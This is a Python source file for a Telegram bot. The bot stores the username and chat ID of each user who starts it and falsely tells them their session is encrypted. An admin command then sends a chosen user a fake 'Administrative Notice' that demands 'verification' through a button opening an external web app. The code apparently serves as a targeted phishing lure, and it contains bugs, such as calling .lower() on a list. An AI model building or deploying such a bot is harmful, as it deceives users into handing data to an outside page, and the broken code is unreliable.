import os
import sqlite3
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

# --- CONFIG ---
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8699819680
TMA_URL = "https://pawsofjoy.github.io/tma-auditor/"

# --- DATABASE SETUP (PERMANENT STORAGE) ---
# This creates a file that survives restarts
conn = sqlite3.connect('users.db', check_same_thread=False)
db = conn.cursor()
db.execute('CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, chat_id INTEGER)')
conn.commit()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uname = user.username.lower() if user.username else str(user.id)
    
    # Save user to permanent file
    db.execute('INSERT OR REPLACE INTO users VALUES (?, ?)', (uname, update.effective_chat.id))
    conn.commit()
    
    if user.id == ADMIN_ID:
        await update.message.reply_text("💠 **Admin Active**\nCommands: `/checkdb`, `/trigger name`")
    else:
        await update.message.reply_text("🛡️ **System Status**: Session Encrypted.")

async def checkdb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    db.execute('SELECT username FROM users')
    rows = db.fetchall()
    if not rows:
        await update.message.reply_text("📭 Database is empty.")
    else:
        msg = "📊 **Stored Users:**\n" + "\n".join([f"• {r}" for r in rows])
        await update.message.reply_text(msg)

async def trigger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/trigger bnbwebina`")
        return

    target = context.args.lower().replace("@", "")
    
    # Look up the ID in the permanent file
    db.execute('SELECT chat_id FROM users WHERE username = ?', (target,))
    result = db.fetchone()
    
    if result:
        chat_id = result
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Verify Authenticity", web_app=WebAppInfo(url=TMA_URL))]])
        try:
            await context.bot.send_message(chat_id=chat_id, text="⚠️ **Administrative Notice**\nVerification required.", reply_markup=keyboard)
            await update.message.reply_text(f"🚀 SUCCESS: Sent to {target}")
        except Exception as e:
            await update.message.reply_text(f"❌ SEND ERROR: {e}")
    else:
        await update.message.reply_text(f"❌ '{target}' not found in database.")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("checkdb", checkdb))
    app.add_handler(CommandHandler("trigger", trigger))
    # drop_pending_updates=True is CRITICAL to fix the "not sending" issue
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
